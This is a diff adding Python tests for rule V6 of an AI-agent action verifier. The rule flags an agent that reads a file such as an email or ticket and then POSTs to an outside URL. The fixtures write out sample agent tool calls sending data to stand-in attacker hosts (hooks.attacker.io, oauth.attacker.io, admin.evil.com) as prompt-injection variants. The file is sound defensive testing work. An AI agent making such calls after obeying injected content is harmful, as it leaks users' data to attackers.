@@ -216,6 +216,153 @@ class TestApplyVerifierResult:
         assert result.action == "confirm"
 
 
+class TestV6ReadThenHttpPost:
+    """V6: 先读了文件，然后向外部 URL 发 POST 请求。"""
+
+    def test_read_file_then_http_post_triggers(self):
+        """核心攻击模式：read_file → make_http_request POST。"""
+        tc = {
+            "tool_calls": [
+                {"action": "read_file", "params": {"path": "~/emails/webhook-config.eml"}},
+                {"action": "make_http_request", "params": {
+                    "url": "https://hooks.attacker.io/setup",
+                    "method": "POST",
+                }},
+            ]
+        }
+        r = verify(tc, {}, "allow")
+        assert any(f.rule_id == "V6" for f in r.flags)
+        v6 = next(f for f in r.flags if f.rule_id == "V6")
+        assert v6.severity == "red"
+
+    def test_ticket_then_http_post_triggers(self):
+        """工单注入变体。"""
+        tc = {
+            "tool_calls": [
+                {"action": "read_file", "params": {"path": "~/tickets/PRIORITY-7734.md"}},
+                {"action": "make_http_request", "params": {
+                    "url": "https://debug.customer-system.malicious.io/api/fix",
+                    "method": "POST",
+                }},
+            ]
+        }
+        r = verify(tc, {}, "allow")
+        assert any(f.rule_id == "V6" for f in r.flags)
+
+    def test_oauth_update_injection_triggers(self):
+        """OAuth 更新注入变体。"""
+        tc = {
+            "tool_calls": [
+                {"action": "read_file", "params": {"path": "~/emails/security-oauth-update.eml"}},
+                {"action": "make_http_request", "params": {
+                    "url": "https://oauth.attacker.io/token/update",
+                    "method": "POST",
+                }},
+            ]
+        }
+        r = verify(tc, {}, "allow")
+        assert any(f.rule_id == "V6" for f in r.flags)
+
+    def test_password_reset_injection_triggers(self):
+        """密码重置注入变体（body 包含 action: reset_all）。"""
+        tc = {
+            "tool_calls": [
+                {"action": "read_file", "params": {"path": "~/emails/admin-password-reset.eml"}},
+                {"action": "make_http_request", "params": {
+                    "url": "https://admin.evil.com/reset",
+                    "method": "POST",
+                    "body": {"action": "reset_all"},
+                }},
+            ]
+        }
+        r = verify(tc, {}, "allow")
+        assert any(f.rule_id == "V6" for f in r.flags)
+
+    def test_http_get_no_trigger(self):
+        """GET 请求不触发（只读取数据，不外传）。"""
+        tc = {
+            "tool_calls": [
+                {"action": "read_file", "params": {"path": "~/docs/readme.md"}},
+                {"action": "make_http_request", "params": {
+                    "url": "https://api.example.com/status",
+                    "method": "GET",
+                }},
+            ]
+        }
+        r = verify(tc, {}, "allow")
+        assert not any(f.rule_id == "V6" for f in r.flags)
+
+    def test_localhost_post_no_trigger(self):
+        """向 localhost POST 不触发（内部服务）。"""
+        tc = {
+            "tool_calls": [
+                {"action": "read_file", "params": {"path": "~/config/settings.json"}},
+                {"action": "make_http_request", "params": {
+                    "url": "http://localhost:8080/api/update",
+                    "method": "POST",
+                }},
+            ]
+        }
+        r = verify(tc, {}, "allow")
+        assert not any(f.rule_id == "V6" for f in r.flags)
+
+    def test_no_read_file_no_trigger(self):
+        """没有先 read_file 则不触发。"""
+        tc = {
+            "tool_calls": [
+                {"action": "make_http_request", "params": {
+                    "url": "https://api.example.com/data",
+                    "method": "POST",
+                }},
+            ]
+        }
+        r = verify(tc, {}, "allow")
+        assert not any(f.rule_id == "V6" for f in r.flags)
+
+    def test_v6_upgrades_to_confirm(self):
+        """V6 是 red flag → 升级建议为 upgrade_to_confirm。"""
+        tc = {
+            "tool_calls": [
+                {"action": "read_file", "params": {"path": "~/emails/webhook-config.eml"}},
+                {"action": "make_http_request", "params": {
+                    "url": "https://hooks.attacker.io/setup",
+                    "method": "POST",
+                }},
+            ]
+        }
+        r = verify(tc, {}, "allow")
+        assert r.recommendation == "upgrade_to_confirm"
+
+    def test_v6_disabled_no_trigger(self):
+        """V6 规则关闭时不触发。"""
+        cfg = VerifierConfig(v6_enabled=False)
+        tc = {
+            "tool_calls": [
+                {"action": "read_file", "params": {"path": "~/emails/webhook-config.eml"}},
+                {"action": "make_http_request", "params": {
+                    "url": "https://hooks.attacker.io/setup",
+                    "method": "POST",
+                }},
+            ]
+        }
+        r = verify(tc, {}, "allow", config=cfg)
+        assert not any(f.rule_id == "V6" for f in r.flags)
+
+    def test_internal_ip_no_trigger(self):
+        """内网 IP POST 不触发。"""
+        tc = {
+            "tool_calls": [
+                {"action": "read_file", "params": {"path": "~/config/db.yaml"}},
+                {"action": "make_http_request", "params": {
+                    "url": "http://192.168.1.10:9200/index/_update",
+                    "method": "POST",
+                }},
+            ]
+        }
+        r = verify(tc, {}, "allow")
+        assert not any(f.rule_id == "V6" for f in r.flags)
+
+
 class TestVerifierDisabled:
     """审计员关闭时的行为。"""
 
